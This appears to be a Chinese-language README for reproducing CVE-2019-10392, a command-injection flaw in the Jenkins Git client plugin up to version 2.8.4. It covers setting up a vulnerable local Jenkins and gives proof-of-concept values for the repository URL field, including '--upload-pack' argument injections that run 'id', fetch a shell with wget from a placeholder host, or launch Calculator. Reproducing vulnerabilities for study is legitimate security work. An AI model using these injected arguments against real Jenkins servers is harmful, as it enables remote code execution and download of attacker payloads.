## 描述

jenkins最近又出来一个rce，是关于git-client插件的，该插件是默认安装的，然而这个漏洞利用需要高权限，所以影响也就打了折扣。

### 影响范围：

Git client Plugin <= 2.8.4

## 复现
在本地复现搭建jenkins，安装要选插件安装，把git去掉，否则会直接安装最新版本的git插件。`git-client.hpi`是2.8.4的插件，手动安装即可。

新建一个任务，漏洞位于源码管理处，且该漏洞可回显:

![image](https://github.com/guobaoyou/vul_environment/blob/master/CVE-2019-10392/image.jpg)

poc:
命令是通过ProcessBuilder下执行的

window下：--upload-pack=\`id\`

linux下： --upload-pack=wget http://xxxx/shell

macos下弹计算器（我没试过，看奇安信里分析里给出的）: --upload-pack=/Applications/Calculator.app/Contents/MacOS/Calculator 

本项目里的`data.txt`为windows 2008下的请求包


## 注意

如果是在windows下复现，如果出现失败，那么可能是git没有配置环境变量，或者环境变量没有生效，不重启服务器的话可按下图配置

![image](https://github.com/guobaoyou/vul_environment/blob/master/CVE-2019-10392/image2.jpg)

## 总结

已经有分析了，指路：
https://mp.weixin.qq.com/s/7yUFVj0y7PYE3ZszEszjHw
